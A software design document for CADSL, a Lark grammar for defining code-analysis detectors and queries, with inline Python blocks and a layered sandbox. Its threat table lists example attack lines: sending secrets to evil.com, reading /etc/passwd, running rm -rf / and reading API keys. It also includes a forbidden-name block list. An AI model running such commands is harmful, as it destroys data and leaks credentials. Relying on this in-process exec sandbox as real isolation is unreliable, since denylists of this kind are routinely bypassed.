# Design Doc: CADSL - Reter Code Analysis DSL Text Grammar

## Context

The Reter Code DSL provides a fluent Python API for defining code analysis tools (queries, detectors, diagrams). Currently, tools must be defined in Python code. We want to enable **dynamic tool loading from text-based definitions** using a Lark-based grammar called **CADSL** (Reter Code Analysis DSL).

### Current Python DSL Example
```python
@detector("god_class", category="design", severity="high")
@param("max_methods", int, default=15)
def god_class() -> Pipeline:
    return (
        reql("SELECT ?c ?name WHERE { ?c type {Class} }")
        .filter(lambda r: r["method_count"] > 15)
        .select("name", "file")
        .order_by("-method_count")
        .limit(100)
        .emit("findings")
    )
```

### Goals
1. Define a text grammar that maps 1:1 to the Python DSL
2. Parse text definitions using Lark
3. Transform AST to executable Pipeline objects
4. Support all current DSL features: queries, detectors, diagrams, parameters

### Design Decisions
- **Syntax**: Brace-delimited (C-style `{}`) for easier parsing
- **External functions**: Inline Python blocks for complex logic
- **Type checking**: Parse-time validation, fail early on type mismatches

---

## Design: CADSL Grammar

### Tool Definition Syntax

```cadsl
# Single-line comments

detector god_class(category="design", severity="high") {
    """Finds classes with too many methods."""

    param max_methods: int = 15;
    param limit: int = 100;

    reql {
        SELECT ?c ?name (COUNT(?m) AS ?method_count)
        WHERE {
            ?c type {Class} .
            ?c name ?name .
            ?m type {Method} .
            ?m definedIn ?c
        }
        GROUP BY ?c ?name
        ORDER BY DESC(?method_count)
        LIMIT {limit}
    }
    | filter { method_count > {max_methods} }
    | select { name, file, method_count }
    | map {
        issue: "god_class",
        message: "Class '{name}' has {method_count} methods",
        suggestion: "Consider splitting into smaller classes"
    }
    | emit { findings }
}
```

### Inline Python Blocks

For complex logic that can't be expressed declaratively:

```cadsl
detector circular_imports(category="dependencies", severity="high") {
    """Detect circular import dependencies."""

    reql {
        SELECT ?m1 ?m2 ?name1 ?name2
        WHERE {
            ?m1 type {Module} . ?m1 name ?name1 .
            ?m2 type {Module} . ?m2 name ?name2 .
            ?m1 imports ?m2
        }
    }
    | python {
        # Full Python code block - has access to `rows` and `ctx`
        from collections import defaultdict

        graph = defaultdict(set)
        for row in rows:
            graph[row["name1"]].add(row["name2"])

        def find_cycles(graph):
            cycles = []
            visited = set()
            path = []

            def dfs(node):
                if node in path:
                    cycle_start = path.index(node)
                    cycles.append(path[cycle_start:] + [node])
                    return
                if node in visited:
                    return
                visited.add(node)
                path.append(node)
                for neighbor in graph.get(node, []):
                    dfs(neighbor)
                path.pop()

            for node in graph:
                dfs(node)
            return cycles

        cycles = find_cycles(graph)
        result = [
            {
                "cycle": " -> ".join(c),
                "length": len(c) - 1,
                "issue": "circular_import",
                "message": f"Circular import detected: {' -> '.join(c)}",
                "suggestion": "Break the cycle by extracting shared code"
            }
            for c in cycles
        ]
    }
    | emit { findings }
}
```

---

## Grammar Rules

```lark
// CADSL.lark - Reter Code Analysis DSL Grammar (Brace-delimited)

start: tool_def+

// ============================================================
// TOOL DEFINITION
// ============================================================

tool_def: tool_type NAME "(" metadata? ")" "{" tool_body "}"

tool_type: "query" -> query
         | "detector" -> detector
         | "diagram" -> diagram

metadata: meta_item ("," meta_item)*
meta_item: NAME "=" value

tool_body: docstring? param_def* pipeline

docstring: TRIPLE_STRING

// ============================================================
// PARAMETERS (with parse-time type validation)
// ============================================================

param_def: "param" NAME ":" type_spec param_default? param_constraint? ";"

type_spec: "int" -> type_int
         | "str" -> type_str
         | "float" -> type_float
         | "bool" -> type_bool
         | "list" -> type_list
         | "list" "<" type_spec ">" -> type_list_of

param_default: "=" value
param_constraint: "choices" "[" value_list "]"
                | "required"

// ============================================================
// PIPELINE
// ============================================================

pipeline: source ("|" step)*

// Sources
source: reql_source
      | rag_source
      | value_source

reql_source: "reql" "{" REQL_CONTENT "}"
rag_source: "rag" "{" STRING ("," "top_k" ":" INT)? "}"
value_source: "value" "{" expr "}"

// REQL is passed through as-is (parsed separately)
REQL_CONTENT: /[^{}]+(\{[^{}]*\}[^{}]*)*/

// ============================================================
// PIPELINE STEPS
// ============================================================

step: filter_step
    | select_step
    | map_step
    | flat_map_step
    | order_by_step
    | limit_step
    | offset_step
    | group_by_step
    | aggregate_step
    | unique_step
    | python_step      // Inline Python
    | render_step
    | emit_step

filter_step: "filter" "{" condition "}"
select_step: "select" "{" field_list "}"
map_step: "map" "{" object_expr "}"
flat_map_step: "flat_map" "{" expr "}"
order_by_step: "order_by" "{" order_field ("," order_field)* "}"
limit_step: "limit" "{" (INT | param_ref) "}"
offset_step: "offset" "{" (INT | param_ref) "}"
group_by_step: "group_by" "{" group_spec "}"
aggregate_step: "aggregate" "{" agg_field ("," agg_field)* "}"
unique_step: "unique" ("{" NAME "}")?
render_step: "render" "{" render_spec "}"
emit_step: "emit" "{" NAME "}"

// Inline Python block
python_step: "python" "{" PYTHON_BLOCK "}"
PYTHON_BLOCK: /[^{}]+(\{[^{}]*\}[^{}]*)*/

// ============================================================
// GROUP BY
// ============================================================

group_spec: group_key ("," "aggregate" ":" aggregate_func)?
          | "_all" ("," "aggregate" ":" aggregate_func)?

group_key: NAME
         | "key" ":" lambda_expr

aggregate_func: NAME
              | "{" agg_field_list "}"

agg_field_list: agg_field ("," agg_field)*
agg_field: NAME ":" agg_op "(" NAME ")"

agg_op: "count" | "sum" | "avg" | "min" | "max" | "collect"

// ============================================================
// RENDER
// ============================================================

render_spec: "format" ":" (STRING | param_ref) ("," "renderer" ":" NAME)?
           | NAME

// ============================================================
// FIELDS & ORDERING
// ============================================================

field_list: field_item ("," field_item)*
field_item: NAME ("as" NAME)?
          | NAME ":" NAME

order_field: "-" NAME -> order_desc
           | "+" NAME -> order_asc
           | NAME -> order_asc

// ============================================================
// CONDITIONS (for filter)
// ============================================================

?condition: or_cond

or_cond: and_cond ("or" and_cond)*
and_cond: not_cond ("and" not_cond)*
not_cond: "not" not_cond -> not_expr
        | comparison

comparison: expr comp_op expr -> binary_comp
          | expr "in" "[" value_list "]" -> in_list
          | expr "in" param_ref -> in_param
          | expr "matches" STRING -> regex_match
          | expr "starts_with" STRING -> starts_with
          | expr "ends_with" STRING -> ends_with
          | expr "contains" STRING -> contains
          | expr "is" "null" -> is_null
          | expr "is" "not" "null" -> is_not_null
          | "(" condition ")"

comp_op: ">" -> gt
       | "<" -> lt
       | ">=" -> gte
       | "<=" -> lte
       | "==" -> eq
       | "!=" -> ne

// ============================================================
// EXPRESSIONS
// ============================================================

?expr: term (("+" | "-") term)*

?term: factor (("*" | "/" | "%") factor)*

?factor: atom
       | "-" factor -> neg
       | "(" expr ")"

?atom: NAME -> field_ref
     | param_ref
     | value
     | atom "." NAME -> prop_access
     | NAME "(" arg_list? ")" -> func_call

param_ref: "{" NAME "}"

arg_list: expr ("," expr)*

lambda_expr: "row" "=>" expr

// ============================================================
// OBJECT EXPRESSIONS (for map)
// ============================================================

object_expr: object_field ("," object_field)*

object_field: NAME ":" expr
            | "..." "row"
            | "..." NAME

// ============================================================
// VALUES
// ============================================================

value: STRING -> string
     | INT -> integer
     | FLOAT -> float_num
     | "true" -> true
     | "false" -> false
     | "null" -> null
     | list_value

value_list: value ("," value)*
list_value: "[" value_list? "]"

// ============================================================
// LEXER RULES
// ============================================================

NAME: /[a-zA-Z_][a-zA-Z0-9_]*/
STRING: /"[^"]*"/ | /'[^']*'/
TRIPLE_STRING: /"""[\s\S]*?"""/
INT: /[0-9]+/
FLOAT: /[0-9]+\.[0-9]+/

COMMENT: /#[^\n]*/ -> skip
WS: /\s+/ -> skip
```

---

## Pipeline Step Mapping

| CADSL Syntax | Python DSL |
|--------------|------------|
| `filter { count > 10 }` | `.filter(lambda r: r["count"] > 10)` |
| `select { name, file, count as total }` | `.select("name", "file", total="count")` |
| `map { issue: "x", ...row }` | `.map(lambda r: {"issue": "x", **r})` |
| `order_by { -count, name }` | `.order_by("-count").order_by("name")` |
| `limit { 100 }` | `.limit(100)` |
| `limit { {max_results} }` | `.limit(ctx.params["max_results"])` |
| `group_by { file, aggregate: {total: sum(count)} }` | `.group_by(field="file", aggregate=...)` |
| `unique { name }` | `.unique(key=lambda r: r["name"])` |
| `emit { findings }` | `.emit("findings")` |

---

## Condition Expression Mapping

| CADSL | Python |
|-------|--------|
| `count > 10` | `r["count"] > 10` |
| `name starts_with "_"` | `r["name"].startswith("_")` |
| `type in ["A", "B"]` | `r["type"] in ["A", "B"]` |
| `name matches "test_.*"` | `re.match(r"test_.*", r["name"])` |
| `not is_private` | `not r["is_private"]` |
| `count > 5 and count < 20` | `r["count"] > 5 and r["count"] < 20` |

---

## Object Expression Mapping

| CADSL | Python |
|-------|--------|
| `{issue: "x", message: "y"}` | `{"issue": "x", "message": "y"}` |
| `{...row, extra: 1}` | `{**r, "extra": 1}` |
| `{name: name, len: len(name)}` | `{"name": r["name"], "len": len(r["name"])}` |
| `{msg: "Class '{name}'"}` | `{"msg": f"Class '{r['name']}'"}` |

---

## Complete Examples

### Example 1: Simple Query
```cadsl
query list_modules() {
    """List all modules in the codebase."""

    param limit: int = 100;

    reql {
        SELECT ?m ?name ?file
        WHERE {
            ?m type {Module} .
            ?m name ?name .
            ?m inFile ?file
        }
        ORDER BY ?name
        LIMIT {limit}
    }
    | select { name, file }
    | emit { modules }
}
```

### Example 2: Detector with Complex Filter
```cadsl
detector long_parameter_list(category="code_smell", severity="medium") {
    """Find functions with too many parameters."""

    param max_params: int = 5;
    param exclude_init: bool = true;

    reql {
        SELECT ?f ?name ?file ?line (COUNT(?p) AS ?param_count)
        WHERE {
            ?f type {Function} .
            ?f name ?name .
            ?f inFile ?file .
            ?f atLine ?line .
            ?p type {Parameter} .
            ?p parameterOf ?f
        }
        GROUP BY ?f ?name ?file ?line
        ORDER BY DESC(?param_count)
    }
    | filter { param_count > {max_params} }
    | filter { not (name == "__init__" and {exclude_init}) }
    | map {
        ...row,
        issue: "long_parameter_list",
        message: "Function '{name}' has {param_count} parameters (max: {max_params})",
        suggestion: "Consider using a parameter object or builder pattern"
    }
    | limit { 100 }
    | emit { findings }
}
```

### Example 3: Diagram with Inline Python Renderer
```cadsl
diagram class_hierarchy() {
    """Generate class inheritance hierarchy diagram."""

    param root_class: str = null;
    param format: str = "mermaid";

    reql {
        SELECT ?c ?className ?base ?baseName
        WHERE {
            ?c type {Class} .
            ?c name ?className .
            OPTIONAL {
                ?c inheritsFrom ?base .
                ?base name ?baseName
            }
        }
        ORDER BY ?className
    }
    | select { className, baseName, c as class_iri, base as base_iri }
    | python {
        # Build hierarchy structure from rows
        from collections import defaultdict

        children = defaultdict(list)
        all_classes = set()

        for row in rows:
            cls = row["className"]
            base = row.get("baseName")
            all_classes.add(cls)
            if base:
                children[base].append(cls)

        # Find root classes (no parent)
        roots = all_classes - set(children.keys())

        def build_tree(name, depth=0):
            return {
                "name": name,
                "depth": depth,
                "children": [build_tree(c, depth+1) for c in sorted(children.get(name, []))]
            }

        result = {
            "roots": [build_tree(r) for r in sorted(roots)],
            "total_classes": len(all_classes)
        }
    }
    | python {
        # Render based on format
        format_type = ctx.params.get("format", "mermaid")

        def render_mermaid(tree, lines, prefix=""):
            lines.append(f"    {tree['name']}")
            for child in tree.get("children", []):
                lines.append(f"    {tree['name']} <|-- {child['name']}")
                render_mermaid(child, lines)

        if format_type == "mermaid":
            lines = ["```mermaid", "classDiagram"]
            for root in rows["roots"]:
                render_mermaid(root, lines)
            lines.append("```")
            result = "\n".join(lines)
        elif format_type == "json":
            import json
            result = json.dumps(rows, indent=2)
        else:
            result = str(rows)
    }
    | emit { diagram }
}
```

### Example 4: Aggregation with Group By
```cadsl
detector modules_with_many_classes(category="complexity", severity="low") {
    """Find modules with too many classes."""

    param max_classes: int = 10;

    reql {
        SELECT ?m ?module_name ?file (COUNT(?c) AS ?class_count)
        WHERE {
            ?m type {Module} .
            ?m name ?module_name .
            ?m inFile ?file .
            ?c type {Class} .
            ?c inModule ?m
        }
        GROUP BY ?m ?module_name ?file
        HAVING (?class_count > {max_classes})
        ORDER BY DESC(?class_count)
    }
    | map {
        ...row,
        issue: "too_many_classes",
        message: "Module '{module_name}' has {class_count} classes",
        suggestion: "Consider splitting into sub-modules"
    }
    | emit { findings }
}
```

### Example 5: RAG-based Semantic Search
```cadsl
query find_similar_code() {
    """Find semantically similar code patterns."""

    param query: str required;
    param top_k: int = 10;

    rag { {query}, top_k: {top_k} }
    | filter { score > 0.7 }
    | select { name, file, line, score }
    | emit { matches }
}
```

---

## Implementation Architecture

```
reter_code/src/reter_code/cadsl/
├── __init__.py           # Public API: load_tool(), load_tools_from_file()
├── grammar.lark          # Lark grammar file
├── parser.py             # Lark parser wrapper with error handling
├── transformer.py        # AST to Pipeline transformer
├── compiler.py           # Expression/condition/Python block compiler
├── validator.py          # Parse-time type validation
├── builtins.py           # Built-in functions (len, str, etc.)
├── python_executor.py    # Safe Python block execution
└── loader.py             # Tool loading from strings/files/directories
```

### Core Classes

```python
# parser.py
class CADSLParser:
    def __init__(self):
        self.parser = Lark.open("grammar.lark", parser="lalr")

    def parse(self, source: str) -> Tree:
        return self.parser.parse(source)

# transformer.py
@v_args(inline=True)
class CADSLTransformer(Transformer):
    def tool_def(self, tool_type, name, metadata, params, pipeline):
        return ToolSpec(name=name, type=tool_type, params=params,
                       pipeline_factory=lambda ctx: pipeline)

    def filter_step(self, condition):
        predicate = self._compile_condition(condition)
        return FilterStep(predicate)

    def select_step(self, fields):
        return SelectStep(*fields.names, **fields.renames)

    def map_step(self, obj_expr):
        transform = self._compile_object_expr(obj_expr)
        return MapStep(transform)

# loader.py
def load_tool(source: str) -> ToolSpec:
    parser = CADSLParser()
    tree = parser.parse(source)
    transformer = CADSLTransformer()
    return transformer.transform(tree)

def load_tools_from_file(path: str) -> List[ToolSpec]:
    with open(path) as f:
        source = f.read()
    return load_tool(source)
```

---

## Expression Compiler

The transformer compiles CADSL expressions to Python callables:

```python
class ExpressionCompiler:
    """Compile CADSL expressions to Python lambdas."""

    def compile_condition(self, cond: Tree) -> Callable[[Dict], bool]:
        """Compile filter condition to predicate function."""
        if cond.data == "comparison":
            left = self.compile_expr(cond.children[0])
            op = cond.children[1]
            right = self.compile_expr(cond.children[2])
            return lambda r, ctx=None: self._compare(left(r), op, right(r))
        elif cond.data == "and_cond":
            left = self.compile_condition(cond.children[0])
            right = self.compile_condition(cond.children[1])
            return lambda r, ctx=None: left(r, ctx) and right(r, ctx)
        # ... etc

    def compile_expr(self, expr: Tree) -> Callable[[Dict], Any]:
        """Compile expression to value extractor."""
        if expr.data == "name":
            field = str(expr.children[0])
            return lambda r: r.get(field)
        elif expr.data == "param_ref":
            param = str(expr.children[0])
            return lambda r, ctx=None: ctx.params.get(param) if ctx else None
        elif expr.data == "literal":
            value = expr.children[0]
            return lambda r: value
        # ... etc

    def compile_object_expr(self, obj: Tree) -> Callable[[Dict], Dict]:
        """Compile map object expression to transform function."""
        fields = []
        for field in obj.children:
            if field.data == "spread":
                fields.append(("__spread__", field.children[0]))
            else:
                name = str(field.children[0])
                value_expr = self.compile_expr(field.children[1])
                fields.append((name, value_expr))

        def transform(r, ctx=None):
            result = {}
            for name, expr in fields:
                if name == "__spread__":
                    result.update(r)
                else:
                    result[name] = expr(r, ctx)
            return result

        return transform
```

---

## String Interpolation

Support f-string style interpolation in map expressions:

```cadsl
map {
    message: "Class '{name}' has {count} methods"
}
```

Compiled to:
```python
lambda r: {"message": f"Class '{r['name']}' has {r['count']} methods"}
```

Implementation:
```python
def compile_interpolated_string(s: str) -> Callable[[Dict], str]:
    """Compile string with {field} interpolations."""
    import re
    pattern = re.compile(r'\{(\w+)\}')

    def interpolate(r, ctx=None):
        def replacer(m):
            field = m.group(1)
            if field in r:
                return str(r[field])
            elif ctx and field in ctx.params:
                return str(ctx.params[field])
            return m.group(0)
        return pattern.sub(replacer, s)

    return interpolate
```

---

## Built-in Functions

```python
BUILTINS = {
    # String functions
    "len": len,
    "str": str,
    "lower": lambda s: s.lower(),
    "upper": lambda s: s.upper(),
    "strip": lambda s: s.strip(),
    "split": lambda s, sep=None: s.split(sep),

    # Math functions
    "abs": abs,
    "min": min,
    "max": max,
    "sum": sum,

    # Type checks
    "is_null": lambda x: x is None,
    "is_empty": lambda x: not x,
}
```

---

## Inline Python Block Execution

Python blocks are executed with specific context variables:

### Execution Model

```python
class PythonStep(Step[T, U]):
    """Execute inline Python code as a pipeline step."""

    def __init__(self, code: str):
        self.code = code
        self.compiled = compile(code, "<cadsl>", "exec")

    def execute(self, data: T, ctx: Optional[Context] = None) -> PipelineResult[U]:
        namespace = {
            "rows": data,
            "ctx": ctx,
            "result": None,
            # Built-in imports
            "defaultdict": defaultdict,
            "Counter": Counter,
            "re": re,
            "json": json,
            "math": math,
        }

        try:
            exec(self.compiled, namespace)

            if "result" not in namespace or namespace["result"] is None:
                return pipeline_err("python", "Python block must set 'result' variable")

            return pipeline_ok(namespace["result"])
        except Exception as e:
            return pipeline_err("python", f"Python execution error: {e}", e)
```

### Available Variables in Python Blocks

| Variable | Type | Description |
|----------|------|-------------|
| `rows` | `List[Dict]` or previous output | Data from previous pipeline step |
| `ctx` | `Context` | Execution context with params |
| `ctx.params` | `Dict[str, Any]` | Tool parameters |
| `ctx.reter` | `Reter` | RETER instance for additional queries |
| `result` | Any | **Must be set** - output of this step |

### Example Python Block Patterns

**Transform and enrich:**
```cadsl
| python {
    result = [
        {**row, "computed": row["a"] + row["b"]}
        for row in rows
    ]
}
```

**Filter with complex logic:**
```cadsl
| python {
    threshold = ctx.params.get("threshold", 10)
    result = [row for row in rows if complex_check(row, threshold)]

    def complex_check(row, threshold):
        return row["a"] > threshold and row["b"] not in EXCLUDED
}
```

**Aggregate and restructure:**
```cadsl
| python {
    from collections import Counter

    counts = Counter(row["category"] for row in rows)
    result = {
        "categories": dict(counts),
        "total": len(rows),
        "unique": len(counts)
    }
}
```

---

## File Structure for Tool Libraries

```
tools/
├── smells.cadsl        # Code smell detectors
├── inspection.cadsl    # Query tools
├── diagrams.cadsl      # Diagram generators
└── custom.cadsl        # User-defined tools
```

Loading:
```python
from cadsl import load_tools_from_directory

tools = load_tools_from_directory("tools/")
for tool in tools:
    Registry.register(tool)
```

---

## Critical Files to Modify

1. **New files to create:**
   - `reter_code/src/reter_code/cadsl/__init__.py`
   - `reter_code/src/reter_code/cadsl/grammar.lark`
   - `reter_code/src/reter_code/cadsl/parser.py`
   - `reter_code/src/reter_code/cadsl/transformer.py`
   - `reter_code/src/reter_code/cadsl/compiler.py`
   - `reter_code/src/reter_code/cadsl/validator.py`
   - `reter_code/src/reter_code/cadsl/builtins.py`
   - `reter_code/src/reter_code/cadsl/python_executor.py`
   - `reter_code/src/reter_code/cadsl/loader.py`

2. **Files to modify:**
   - `reter_code/src/reter_code/dsl/registry.py` - Add CADSL loader integration
   - `reter_code/src/reter_code/services/tool_registrar.py` - Load `.cadsl` files

---

## Implementation Steps

### Phase 1: Core Parser
1. Create `reter_code/src/reter_code/cadsl/grammar.lark` with all grammar rules
2. Implement `parser.py` - Lark parser wrapper with error handling
3. Implement `validator.py` - Parse-time type validation

### Phase 2: AST Transformer
4. Implement `transformer.py` - Convert Lark AST to Pipeline objects
5. Implement `compiler.py` - Expression/condition compiler
   - Condition compiler (filter expressions)
   - Object expression compiler (map expressions)
   - String interpolation

### Phase 3: Python Execution
6. Implement `python_executor.py` - Safe Python block execution
7. Add `builtins.py` - Built-in functions (len, str, etc.)

### Phase 4: Integration
8. Implement `loader.py` - Load from strings/files/directories
9. Add `__init__.py` - Public API
10. Integrate with `reter_code/src/reter_code/dsl/registry.py`
11. Update `reter_code/src/reter_code/services/tool_registrar.py` to load `.cadsl` files

### Phase 5: Testing
12. Add unit tests for parser
13. Add unit tests for transformer
14. Add integration tests for complete tool loading
15. Add example `.cadsl` files

---

## Resolved Design Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| Syntax style | Brace-delimited `{}` | Easier to parse, no INDENT/DEDENT handling |
| External functions | Inline Python blocks | Full power of Python, no registry needed |
| Type validation | Parse-time | Fail early, better developer experience |

## Remaining Considerations

1. **Error messages**: How detailed for syntax errors?
   - Recommendation: Use Lark's built-in error reporting with line/column info

2. **Hot reloading**: Should file changes trigger automatic tool reload?
   - Recommendation: Yes, via file watcher in development mode

---

## Security Architecture for Python Blocks

Inline Python blocks pose security risks. This section defines a multi-layer defense strategy.

### Threat Analysis

| Threat | Risk | Example Attack |
|--------|------|----------------|
| File system access | High | `open('/etc/passwd').read()` |
| Network access | High | `requests.get('http://evil.com?data='+secrets)` |
| Process execution | Critical | `os.system('rm -rf /')` |
| Arbitrary imports | High | `import subprocess; subprocess.call(...)` |
| Resource exhaustion | Medium | `while True: pass` or `'x' * 10**10` |
| Environment access | High | `os.environ['API_KEY']` |

### Multi-Layer Defense

```
┌─────────────────────────────────────────────────────────────┐
│                    CADSL Python Block                        │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 1: AST Validation (compile-time)                     │
│  - Block exec(), eval(), compile(), __import__              │
│  - Block attribute access to __class__, __bases__, etc.     │
│  - Block dangerous patterns                                  │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 2: Restricted Builtins (runtime)                     │
│  - Whitelist safe functions only                            │
│  - No open(), input(), globals(), locals()                  │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 3: Import Whitelist                                  │
│  - Only pre-approved modules (re, json, math, collections)  │
│  - Block os, sys, subprocess, socket, requests              │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  Layer 4: Resource Limits                                   │
│  - Execution timeout (default: 30s)                         │
│  - Memory limit (default: 100MB)                            │
│  - Recursion depth limit                                     │
└─────────────────────────────────────────────────────────────┘
```

### Layer 1: AST Validation

```python
# reter_code/src/reter_code/cadsl/sandbox.py

import ast
from typing import List

FORBIDDEN_NAMES = {
    # Dangerous builtins
    'eval', 'exec', 'compile', '__import__', 'open', 'input',
    'globals', 'locals', 'vars', 'dir', 'getattr', 'setattr',
    'delattr', 'hasattr', 'breakpoint', 'memoryview', 'type',

    # Dangerous attributes
    '__class__', '__bases__', '__mro__', '__subclasses__',
    '__code__', '__globals__', '__builtins__', '__dict__',
    '__module__', '__reduce__', '__reduce_ex__',
}

FORBIDDEN_ATTRIBUTES = {
    '__class__', '__bases__', '__mro__', '__subclasses__',
    '__code__', '__globals__', '__builtins__', '__dict__',
    '__qualname__', '__func__', '__self__', '__module__',
}

class SecurityValidator(ast.NodeVisitor):
    """Validate AST for security violations."""

    def __init__(self):
        self.violations: List[str] = []

    def visit_Import(self, node: ast.Import):
        self.violations.append(
            f"Line {node.lineno}: Direct imports not allowed. "
            f"Use pre-imported modules: re, json, math, collections"
        )

    def visit_ImportFrom(self, node: ast.ImportFrom):
        self.violations.append(
            f"Line {node.lineno}: From imports not allowed. "
            f"Use pre-imported modules."
        )

    def visit_Name(self, node: ast.Name):
        if node.id in FORBIDDEN_NAMES:
            self.violations.append(
                f"Line {node.lineno}: Forbidden name '{node.id}'"
            )
        self.generic_visit(node)

    def visit_Attribute(self, node: ast.Attribute):
        if node.attr in FORBIDDEN_ATTRIBUTES:
            self.violations.append(
                f"Line {node.lineno}: Forbidden attribute '{node.attr}'"
            )
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call):
        if isinstance(node.func, ast.Name):
            if node.func.id in ('getattr', 'setattr', 'delattr'):
                self.violations.append(
                    f"Line {node.lineno}: {node.func.id}() not allowed"
                )
        self.generic_visit(node)

def validate_ast(code: str) -> List[str]:
    """Validate code AST for security issues."""
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        return [f"Syntax error: {e}"]

    validator = SecurityValidator()
    validator.visit(tree)
    return validator.violations
```

### Layer 2: Restricted Builtins

```python
SAFE_BUILTINS = {
    # Types
    'bool': bool,
    'int': int,
    'float': float,
    'str': str,
    'list': list,
    'dict': dict,
    'set': set,
    'tuple': tuple,
    'frozenset': frozenset,
    'bytes': bytes,

    # Safe functions
    'len': len,
    'range': range,
    'enumerate': enumerate,
    'zip': zip,
    'map': map,
    'filter': filter,
    'sorted': sorted,
    'reversed': reversed,
    'sum': sum,
    'min': min,
    'max': max,
    'abs': abs,
    'round': round,
    'all': all,
    'any': any,
    'isinstance': isinstance,
    'repr': repr,
    'print': print,  # Output captured

    # Safe exceptions
    'Exception': Exception,
    'ValueError': ValueError,
    'TypeError': TypeError,
    'KeyError': KeyError,
    'IndexError': IndexError,
    'StopIteration': StopIteration,

    # Constants
    'True': True,
    'False': False,
    'None': None,
}
```

### Layer 3: Import Whitelist

```python
import re
import json
import math
from collections import defaultdict, Counter, OrderedDict, deque
from itertools import chain, groupby, islice, takewhile, dropwhile
from functools import reduce

ALLOWED_IMPORTS = {
    # Safe standard library
    're': re,
    'json': json,
    'math': math,

    # Collections
    'defaultdict': defaultdict,
    'Counter': Counter,
    'OrderedDict': OrderedDict,
    'deque': deque,

    # Itertools (safe)
    'chain': chain,
    'groupby': groupby,
    'islice': islice,
    'takewhile': takewhile,
    'dropwhile': dropwhile,

    # Functools (safe subset)
    'reduce': reduce,
}
```

### Layer 4: Resource Limits

```python
import sys
import signal
import resource
from contextlib import contextmanager

class ExecutionTimeout(Exception):
    """Raised when code execution times out."""
    pass

class MemoryLimitExceeded(Exception):
    """Raised when memory limit is exceeded."""
    pass

@contextmanager
def resource_limits(timeout_sec: int = 30, memory_mb: int = 100):
    """Apply resource limits to code execution."""

    def timeout_handler(signum, frame):
        raise ExecutionTimeout(f"Execution timed out after {timeout_sec}s")

    # Set timeout (Unix only)
    if hasattr(signal, 'SIGALRM'):
        old_handler = signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(timeout_sec)

    # Set memory limit (Unix only)
    if hasattr(resource, 'RLIMIT_AS'):
        soft, hard = resource.getrlimit(resource.RLIMIT_AS)
        resource.setrlimit(resource.RLIMIT_AS,
                          (memory_mb * 1024 * 1024, hard))

    # Set recursion limit
    old_recursion = sys.getrecursionlimit()
    sys.setrecursionlimit(200)

    try:
        yield
    finally:
        # Restore limits
        if hasattr(signal, 'SIGALRM'):
            signal.alarm(0)
            signal.signal(signal.SIGALRM, old_handler)
        if hasattr(resource, 'RLIMIT_AS'):
            resource.setrlimit(resource.RLIMIT_AS, (soft, hard))
        sys.setrecursionlimit(old_recursion)
```

### Secure Executor

```python
class SecurePythonExecutor:
    """Execute Python code in a sandboxed environment."""

    def __init__(
        self,
        timeout_sec: int = 30,
        memory_mb: int = 100,
        security_level: str = "standard"  # trusted, standard, restricted
    ):
        self.timeout_sec = timeout_sec
        self.memory_mb = memory_mb
        self.security_level = security_level

    def execute(self, code: str, rows: Any, ctx: Any) -> Dict[str, Any]:
        """Execute code securely and return result."""

        # Layer 1: AST Validation
        if self.security_level != "trusted":
            violations = validate_ast(code)
            if violations:
                return {
                    "success": False,
                    "error": "Security validation failed",
                    "violations": violations
                }

        # Compile code
        try:
            compiled = compile(code, "<cadsl-python>", "exec")
        except SyntaxError as e:
            return {"success": False, "error": f"Syntax error: {e}"}

        # Build namespace with restricted builtins
        namespace = {
            "__builtins__": SAFE_BUILTINS if self.security_level != "trusted" else __builtins__,
            **ALLOWED_IMPORTS,
            "rows": rows,
            "ctx": ctx,
            "result": None,
        }

        # Execute with resource limits
        try:
            if self.security_level == "restricted":
                with resource_limits(self.timeout_sec, self.memory_mb):
                    exec(compiled, namespace)
            else:
                exec(compiled, namespace)

            if namespace.get("result") is None:
                return {
                    "success": False,
                    "error": "Python block must set 'result' variable"
                }

            return {"success": True, "result": namespace["result"]}

        except ExecutionTimeout as e:
            return {"success": False, "error": str(e)}
        except MemoryLimitExceeded as e:
            return {"success": False, "error": str(e)}
        except Exception as e:
            return {"success": False, "error": f"Execution error: {e}"}
```

### Security Levels in Tool Definition

Tools can specify their security level:

```cadsl
# Trusted - no restrictions (for internal/verified tools)
detector internal_tool(security="trusted") {
    python {
        import os  # Allowed in trusted mode
        result = os.listdir(".")
    }
}

# Standard (default) - AST validation + restricted builtins
detector standard_tool() {
    python {
        # Safe operations only
        result = [row for row in rows if row["count"] > 10]
    }
}

# Restricted - full sandboxing with resource limits
query user_tool(security="restricted") {
    python {
        # Timeout and memory limits enforced
        result = expensive_computation(rows)
    }
}
```

### Capability-Based Permissions

For fine-grained access control, tools can request specific capabilities:

```cadsl
# Explicitly grant capabilities
detector config_reader(capabilities=["fs:read:/app/config/*"]) {
    python {
        # Can read files in /app/config/ because capability granted
        config = safe_read(ctx.capabilities, "/app/config/settings.json")
        result = process(rows, json.loads(config))
    }
}
```

```python
# Capability-aware operations
def safe_read(capabilities: Set[str], path: str) -> str:
    """Read file only if capability allows."""
    for cap in capabilities:
        if cap.startswith("fs:read:"):
            pattern = cap[8:]  # Remove "fs:read:" prefix
            if fnmatch.fnmatch(path, pattern):
                with open(path, "r") as f:
                    return f.read()
    raise PermissionError(f"No fs:read capability for {path}")
```

### Available Capabilities

| Capability | Description |
|------------|-------------|
| `fs:read:<pattern>` | Read files matching glob pattern |
| `fs:write:<pattern>` | Write files matching glob pattern |
| `net:http:<domain>` | HTTP requests to specific domain |
| `env:<var>` | Access specific environment variable |
| `subprocess:<cmd>` | Run specific subprocess command |

### Security Summary

| Layer | Protection | Default |
|-------|------------|---------|
| AST Validation | Block dangerous constructs | Enabled |
| Restricted Builtins | No `eval`, `exec`, `open` | Enabled |
| Import Whitelist | Only safe modules | Enabled |
| Resource Limits | Timeout + memory cap | Restricted mode |
| Security Levels | Per-tool trust settings | `standard` |
| Capabilities | Explicit permission grants | None |

### Updated File Structure

```
reter_code/src/reter_code/cadsl/
├── __init__.py
├── grammar.lark
├── parser.py
├── transformer.py
